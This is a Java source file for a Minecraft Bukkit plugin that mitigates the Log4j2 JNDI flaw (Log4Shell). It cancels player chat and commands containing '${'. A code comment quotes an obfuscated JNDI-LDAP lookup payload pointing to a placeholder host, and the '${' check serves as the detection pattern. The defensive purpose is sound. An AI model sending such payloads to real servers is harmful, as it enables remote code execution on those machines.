package pw.yumc.MiaoLog4j2Fix;

import lombok.SneakyThrows;
import org.bukkit.Bukkit;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;
import org.bukkit.plugin.java.JavaPlugin;
import pw.yumc.MiaoLog4j2Fix.reflect.Reflect;

/**
 * 喵式脚本
 *
 * @author 喵♂呜
 * @since 2016年8月29日 上午7:50:39
 */
public class MiaoLog4j2FixBukkit extends JavaPlugin implements Listener {
    @SneakyThrows
    @Override
    public void onLoad() {
        new MiaoLog4j2Fix(Reflect.on(Bukkit.getServer()).field("console").get());
    }

    @Override
    public void onEnable() {
        Bukkit.getPluginManager().registerEvents(this, this);
    }

    @EventHandler
    public void onChat(AsyncPlayerChatEvent event) {
        event.setCancelled(this.check(event.getMessage()));
    }

    @EventHandler
    public void onCommand(PlayerCommandPreprocessEvent event) {
        event.setCancelled(this.check(event.getMessage()));
    }

    private boolean check(String s) {
        // ${${env-:j}ndi:ldap://xxx} 情况太多了 直接屏蔽${
        return s.contains("${");
    }
}
